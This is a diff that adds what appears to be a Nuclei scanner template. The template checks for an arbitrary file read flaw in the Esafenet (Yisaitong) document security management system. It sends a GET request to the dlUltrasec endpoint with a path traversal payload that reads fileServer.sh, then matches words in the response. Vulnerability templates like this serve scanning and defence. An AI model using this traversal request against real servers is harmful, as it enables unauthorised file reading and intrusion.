@@ -1,0 +1,17 @@
+id: poc-yaml-yisaitong-esafenet-dlultrasec-anyfile-read
+info:
+  name: 亿赛通电子文档安全管理系统 dlUltrasec 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/linuxUpdate/dlUltrasec?path=../../../../../../../../../esafenet/fileServer/fileServer.sh&type=1"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "fileServer.jar"
+          - "/bin/bash"
